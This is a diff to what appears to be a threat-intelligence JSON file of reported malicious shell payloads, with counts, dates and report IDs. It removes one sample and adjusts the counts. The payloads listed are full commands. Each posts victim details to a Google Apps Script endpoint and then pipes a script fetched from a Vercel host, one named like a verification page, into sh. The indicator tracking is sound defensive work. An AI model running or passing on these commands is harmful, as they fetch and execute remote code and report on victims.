@@ -503,12 +503,11 @@
   },
   {
     "Pattern": "curl -sL -d \"id=<UUID>&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=<ENCODED_URL>&os=Linux%20x86_64&lastVisitAt=<TIMESTAMP>&lastShellAt=<TIMESTAMP>\" \"<URL>\" && wget -qO- '<URL>' -L | sh",
-    "DistinctPayloadCount": 65,
-    "ReportCount": 65,
-    "FirstSeen": "2026-11-13T09:28:22.206000+00:00",
+    "DistinctPayloadCount": 64,
+    "ReportCount": 64,
+    "FirstSeen": "2026-11-13T18:28:15.921000+00:00",
     "LastSeen": "2026-11-20T05:24:19.392000+00:00",
     "ReportIds": [
-      "cmwerxwap0e0d0omlo90ozon6",
       "cmwfb87f30g8x0omlp6pbqff9",
       "cmwh8ut7p0pca0omlsvkn7e9j",
       "cmwh8vnll0pd20oml373zg9sc",
@@ -613,7 +612,6 @@
       "curl -sL -d \"id=9559fe19-51b4-4fcc-9d02-2400bae2d826&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fdesrecettesfaciles[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-15T03%3A22%3A23.142Z&lastShellAt=2026-11-15T03%3A22%3A23.142Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=9aca30a1-67bb-456d-bc52-157117a2b06e&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fwestlegendre[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-18T04%3A53%3A33.777Z&lastShellAt=2026-11-18T04%3A53%3A33.777Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=9edbe25b-a982-43a3-a32f-4f4c184a8f8e&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fabhishekrastogi[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-15T03%3A52%3A36.923Z&lastShellAt=2026-11-15T03%3A52%3A36.923Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
-      "curl -sL -d \"id=a63b59e2-3190-4cd7-a9fb-b9603df4767c&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fsoloflightdesign[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-13T09%3A26%3A58.006Z&lastShellAt=2026-11-13T09%3A26%3A58.006Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=a84a1d7a-2fe1-4e25-95c5-229ef6b01df9&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fnucleus.ltd%2F&os=Linux%20x86_64&lastVisitAt=2026-11-19T15%3A26%3A47.440Z&lastShellAt=2026-11-19T15%3A26%3A47.440Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=ad254d11-9f56-4c8a-8536-62dfda068e73&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fammediterrania[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-15T03%3A36%3A08.314Z&lastShellAt=2026-11-15T03%3A36%3A08.314Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=ae8b66fc-b4e6-4866-91b6-8f4c3fafb9d5&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Ftheeventsmafia[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-18T02%3A35%3A04.554Z&lastShellAt=2026-11-18T02%3A35%3A04.554Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
